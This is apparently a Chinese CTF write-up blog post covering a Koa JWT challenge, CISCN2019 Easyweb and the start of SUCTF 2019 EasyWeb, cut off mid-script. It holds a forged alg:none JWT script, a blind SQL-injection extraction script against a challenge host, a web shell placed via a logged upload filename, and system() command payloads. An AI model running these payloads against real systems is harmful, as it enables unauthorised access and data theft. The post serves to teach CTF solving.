<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">JWT </span>的密钥爆破需要在一定的前提下进行：<br><br>知悉<span class="hljs-keyword">JWT使用的加密算法</span><br><span class="hljs-keyword"></span>一段有效的、已签名的token<br>签名用的密钥不复杂（弱密钥）<br></code></pre></td></tr></table></figure>
<p>可能是密钥太复杂了叭😿<br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9376?time__1311=n4+xuDgD9DyiGQQP405DK32O=KKAKw5wN4x&alichlgref=https://www.google.com/#toc-7">JWT攻击学习</a></p>
<p>查看wp发现app.js里说明了所用框架koa<br>koa目录的基本结构<br><img src="/images/20210413175013673.png" srcset="/img/loading.gif" lazyload><br>这里大佬们按照koa框架的常见结构去获取下控制器文件的源码</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/controllers/</span>api.js<br></code></pre></td></tr></table></figure>
<p>访问一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">crypto</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;crypto&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">fs</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>)<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">jwt</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;jsonwebtoken&#x27;</span>)<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">APIError</span> = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../rest&#x27;</span>).APIError;<br><br>module.exports = &#123;<br>    <span class="hljs-string">&#x27;POST /api/register&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || username === <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;register error&#x27;</span>, <span class="hljs-string">&#x27;wrong username&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">global</span>.secrets.length &gt; <span class="hljs-number">100000</span>) &#123;<br>            <span class="hljs-keyword">global</span>.secrets = [];<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = crypto.<span class="hljs-title function_ invoke__">randomBytes</span>(<span class="hljs-number">18</span>).<span class="hljs-title function_ invoke__">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>);<br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secretid</span> = <span class="hljs-keyword">global</span>.secrets.length;<br>        <span class="hljs-keyword">global</span>.secrets.<span class="hljs-title function_ invoke__">push</span>(secret)<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = jwt.<span class="hljs-title function_ invoke__">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">token</span>: token<br>        &#125;);<br><br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;POST /api/login&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">const</span> &#123;username, password&#125; = ctx.request.body;<br><br>        <span class="hljs-keyword">if</span>(!username || !password) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;username or password is necessary&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">token</span> = ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">sid</span> = JSON.<span class="hljs-title function_ invoke__">parse</span>(Buffer.<span class="hljs-keyword">from</span>(token.<span class="hljs-title function_ invoke__">split</span>(<span class="hljs-string">&#x27;.&#x27;</span>)[<span class="hljs-number">1</span>], <span class="hljs-string">&#x27;base64&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>()).secretid;<br><br>        console.<span class="hljs-title function_ invoke__">log</span>(sid)<br><br>        <span class="hljs-keyword">if</span>(sid === undefined || sid === <span class="hljs-literal">null</span> || !(sid &lt; <span class="hljs-keyword">global</span>.secrets.length &amp;&amp; sid &gt;= <span class="hljs-number">0</span>)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;login error&#x27;</span>, <span class="hljs-string">&#x27;no such secret id&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">secret</span> = <span class="hljs-keyword">global</span>.secrets[sid];<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">user</span> = jwt.<span class="hljs-title function_ invoke__">verify</span>(token, secret, &#123;<span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;HS256&#x27;</span>&#125;);<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">status</span> = username === user.username &amp;&amp; password === user.password;<br><br>        <span class="hljs-keyword">if</span>(status) &#123;<br>            ctx.session.username = username;<br>        &#125;<br><br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            status<br>        &#125;);<br><br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/flag&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        <span class="hljs-keyword">if</span>(ctx.session.username !== <span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-string">&#x27;permission error&#x27;</span>, <span class="hljs-string">&#x27;permission denied&#x27;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">const</span> <span class="hljs-variable constant_">flag</span> = fs.<span class="hljs-title function_ invoke__">readFileSync</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>).<span class="hljs-title function_ invoke__">toString</span>();<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            flag<br>        &#125;);<br><br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;,<br><br>    <span class="hljs-string">&#x27;GET /api/logout&#x27;</span>: <span class="hljs-title function_ invoke__">async</span> (ctx, next) =&gt; &#123;<br>        ctx.session.username = <span class="hljs-literal">null</span>;<br>        ctx.<span class="hljs-title function_ invoke__">rest</span>(&#123;<br>            <span class="hljs-attr">status</span>: <span class="hljs-literal">true</span><br>        &#125;)<br>        await <span class="hljs-title function_ invoke__">next</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>

<p><strong>空加密算法</strong><br>JWT支持使用空加密算法，可以在header中指定alg为None</p>
<p>将secret置空。利用node的jsonwentoken库已知缺陷：当jwt的secret为null或undefined时，jsonwebtoken会采用algorithm为none进行验证</p>
<p>因为alg为none,所以只要把signature设置为空（即不添加signature字段），提交到服务器，token都可以通过服务器的验证</p>
<p><img src="/images/PR5RZ77UV7NBH7HZ93B.png" srcset="/img/loading.gif" lazyload><br>生成JWT<br><img src="/images/IIFDT3JFX9V5VAW.png" srcset="/img/loading.gif" lazyload><br>&#x2F;api&#x2F;flag路径校验为admin用户才会返回flag，而登录验证方式采用的是JWT，所以可以尝试对JWT进行破解修改。并且生成JWT是用HS256加密，可以把它改为None来进行破解。标题中的alg字段更改为none，有些JWT库支持无算法，即没有签名算法。当alg为none时，后端将不执行签名验证，此外对于本题中验证采用的密钥secret值也需要为空或者underfined，否则还是会触发验证，js是弱语言类型，我们可以将secretid设置为一个小数或空数组(空数组与数字比较时为0)来绕过secretid的一个验证(不能为null&amp;undefined)<br><img src="/images/U7Z9HCB3RXK1HZLG5N.png" srcset="/img/loading.gif" lazyload><br>这里需要一个python脚本</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">import <span class="hljs-keyword">jwt</span><br><span class="hljs-keyword"></span>token_dict = &#123;<br>  <span class="hljs-string">&quot;secretid&quot;</span>: [],<br>  <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>,<br>  <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1710510302</span><br>&#125;<br><br>headers = &#123;<br>  <span class="hljs-string">&quot;alg&quot;</span>: <span class="hljs-string">&quot;none&quot;</span>,<br>  <span class="hljs-string">&quot;typ&quot;</span>: <span class="hljs-string">&quot;JWT&quot;</span><br>&#125;<br><span class="hljs-keyword">jwt_token </span>= <span class="hljs-keyword">jwt.encode(token_dict, </span> <span class="hljs-comment"># payload, 有效载体</span><br>                       <span class="hljs-string">&quot;&quot;</span>,  <span class="hljs-comment"># 进行加密签名的密钥</span><br>                       algorithm=<span class="hljs-string">&quot;none&quot;</span>,  <span class="hljs-comment"># 指明签名算法方式, 默认也是HS256</span><br>                       headers=headers <br>                       )<br>print(<span class="hljs-keyword">jwt_token)</span><br><span class="hljs-keyword"></span><br></code></pre></td></tr></table></figure>
<p><img src="/images/21QGA8N3P1C7VO2.png" srcset="/img/loading.gif" lazyload><br>生成后替换原有的<br>然后进入&#x2F;api&#x2F;flag找到flag<br><img src="/images/9YW31YZD1ZY45A4P.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>进入环境，发现只有登录界面，没有找到注册<br>那么大概就是sql注入了</p>
<p>注入没反应<br>源码也啥也没找到<br>上dirsearch<br>扫到robots.txt<br>不知道为什么这里的robots.txt内容为&#x2F;static&#x2F;secretkey.txt<br><img src="/images/08197AC17SPJ0T2H8BJ1.png" srcset="/img/loading.gif" lazyload><br>看了题解，robots.txt里的内容应该是<br><img src="/images/UIDFOKY8DKGO5BCO3X.png" srcset="/img/loading.gif" lazyload><br>题目描述里提供了源码GitHub链接<br>GitHub里的源码也是一样<br>这里不太懂为什么会这样<br>把dirsearch扫到的几个php文件都试一遍<br>最后在访问image.php.bak时成功下载文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;id&quot;</span>]:<span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-variable">$path</span>=<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>])?<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;path&quot;</span>]:<span class="hljs-string">&quot;&quot;</span>;<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$path</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\\0&quot;</span>,<span class="hljs-string">&quot;%00&quot;</span>,<span class="hljs-string">&quot;\\&#x27;&quot;</span>,<span class="hljs-string">&quot;&#x27;&quot;</span>),<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$path</span>);<br><br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;select * from images where id=&#x27;<span class="hljs-subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="hljs-subst">&#123;$path&#125;</span>&#x27;&quot;</span>);<br><span class="hljs-variable">$row</span>=<span class="hljs-title function_ invoke__">mysqli_fetch_array</span>(<span class="hljs-variable">$result</span>,MYSQLI_ASSOC);<br><br><span class="hljs-variable">$path</span>=<span class="hljs-string">&quot;./&quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;path&quot;</span>];<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: image/jpeg&quot;</span>);<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$path</span>);<br><br></code></pre></td></tr></table></figure>

<p><strong>addslashes()函数</strong></p>
<p><img src="/images/X0TJURPAN5C4V2T1B.png" srcset="/img/loading.gif" lazyload></p>
<p>str_replace将\0,%00,\‘,”‘“替换成空(前面第一个\是用来转义的，使其不被解释为其原始含义，而是作为普通字符处理)。</p>
<p>因为要SQL注入，所以要破开引号，但是引号被转义。若是当我输入”?id&#x3D;\0”,经过addslashes()–&gt;”?id&#x3D;\0”再经过str_replace–&gt;”?id&#x3D;&quot;,SQL语句就变为</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> images <span class="hljs-keyword">where</span> id=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-type">path</span>=<span class="hljs-string">&#x27;&#123;$path&#125;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>这样由于\右边的单引号被转义,导致原有的SQL语句引号闭合发生错误。实际上id&#x3D;&#39; or path&#x3D;。现在我们可以对path进行sql注入</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">id</span>=\0&amp;path=or <span class="hljs-attribute">1</span>=1#<br><br>select * <span class="hljs-keyword">from</span> images where <span class="hljs-attribute">id</span>=<span class="hljs-string">&#x27;\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">path</span>=<span class="hljs-string">&#x27;or 1=1%23&#x27;</span><br></code></pre></td></tr></table></figure>
<p>确定了SQL注入的姿势，写好脚本</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import requests<br><br>url = <span class="hljs-string">&quot;http://db4624a1-f8f4-48f5-8a2c-1936066abc00.node5.buuoj.cn:81/image.php&quot;</span><br><span class="hljs-built_in">result</span> = <span class="hljs-string">&#x27;&#x27;</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>    i = i + <span class="hljs-number">1</span><br>    low = <span class="hljs-number">32</span><br>    high = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> low &lt; high:<br>        <span class="hljs-keyword">mid</span> = (low + high)<span class="hljs-comment"> // 2</span><br>        payload = f<span class="hljs-string">&#x27;?id=\\0&amp;path=or if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;?id=\\0&amp;path=or if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=0x636973636e66696e616c),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;?id=\\0&amp;path=or if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br>        <span class="hljs-comment"># payload = f&#x27;?id=\\0&amp;path=or if(ascii(substr((select group_concat(username,0x7e,password) from ciscnfinal.users),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)%23&#x27;</span><br><br>        r = requests.<span class="hljs-built_in">get</span>(url=url + payload)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;JFIF&#x27;</span> <span class="hljs-keyword">in</span> r.<span class="hljs-keyword">text</span>:<br>            low = <span class="hljs-keyword">mid</span> + <span class="hljs-number">1</span><br>            <span class="hljs-comment"># time.sleep(0.1)</span><br>        <span class="hljs-keyword">else</span>:<br>            high = <span class="hljs-keyword">mid</span><br>    <span class="hljs-keyword">if</span> low != <span class="hljs-number">32</span>:<br>        <span class="hljs-built_in">result</span> += chr(low)<br>        print(<span class="hljs-built_in">result</span>)<br>    <span class="hljs-keyword">else</span>:<br>        break<br><br><br></code></pre></td></tr></table></figure>
<p><img src="/images/N9CGYYCEP3EZQDEJ68.png" srcset="/img/loading.gif" lazyload><br>爆出账号密码<br><img src="/images/GCXTCVGQWGKY2051IB.png" srcset="/img/loading.gif" lazyload><br>登录后跳转到一个新的页面<br>文件上传，试下文件上传的漏洞<br>先随便上传一个文件<br><img src="/images/V4ITWGNOKYAMX8T43AAI.png" srcset="/img/loading.gif" lazyload><br>找到上传路径<br><img src="/images/UC7SUGRR0YF9MOJA.png" srcset="/img/loading.gif" lazyload><br>进入路径发现会将文件名写进日志，而且日志还是php文件<br>把文件名写为一句话木马<br><img src="/images/EGJS4BX55M1QSF1L0Z.png" srcset="/img/loading.gif" lazyload><br><img src="/images/98BULSOGXEVGOMI0.png" srcset="/img/loading.gif" lazyload><br>不能上传php文件<br>我们改一下一句话木马<br><img src="/images/T8SO83LCB9T9Q.png" srcset="/img/loading.gif" lazyload><br>成功上传<br><img src="/images/4UYQN5DH5PEUE16EQVHR.png" srcset="/img/loading.gif" lazyload><br>看样子php语句写进去了<br>直接命令执行</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span>=system(<span class="hljs-string">&#x27;ls&#x27;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attr">a</span>=system(<span class="hljs-string">&#x27;ls /&#x27;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attr">a</span>=system(<span class="hljs-string">&#x27;cat /flag&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>这里有大佬用其它方法做的，直接算出admin的cookie🥶<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wkzb/p/12562379.html">传送门</a></p>
<h2 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a>[SUCTF 2019]EasyWeb</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_the_flag</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// webadmin will remove your upload file every 20 min!!!! </span><br>    <span class="hljs-variable">$userdir</span> = <span class="hljs-string">&quot;upload/tmp_&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$userdir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$userdir</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>]))&#123;<br>        <span class="hljs-variable">$tmp_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br>        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>        <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$name</span>, <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$name</span>,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ph/i&quot;</span>,<span class="hljs-variable">$extension</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp_name</span>), <span class="hljs-string">&#x27;&lt;?&#x27;</span>)!==False) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$tmp_name</span>)) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;^_^&quot;</span>); <br>        <span class="hljs-variable">$path</span>= <span class="hljs-variable">$userdir</span>.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$name</span>;<br>        @<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$tmp_name</span>, <span class="hljs-variable">$path</span>);<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$path</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$hhh</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;_&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$hhh</span>)&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$hhh</span>)&gt;<span class="hljs-number">18</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;One inch long, one inch strong!&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> ( <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[\x00- 0-9A-Za-z\&#x27;&quot;\`~_&amp;.,|=[\x7F]+/i&#x27;</span>, <span class="hljs-variable">$hhh</span>) )<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Try something else!&#x27;</span>);<br><br><span class="hljs-variable">$character_type</span> = <span class="hljs-title function_ invoke__">count_chars</span>(<span class="hljs-variable">$hhh</span>, <span class="hljs-number">3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$character_type</span>)&gt;<span class="hljs-number">12</span>) <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Almost there!&quot;</span>);<br><br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$hhh</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>先不看这个函数，我们要绕过这个正则表达式，且不能超过18个字节，那么可以使用异或或者取反，在这题里取反符~被过滤了，所以我们用异或，这里搞到大佬写的脚本<br>异或脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finds</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>	<span class="hljs-variable">$index</span> = <span class="hljs-number">0</span>;<br>	<span class="hljs-variable">$a</span>=[<span class="hljs-number">33</span>,<span 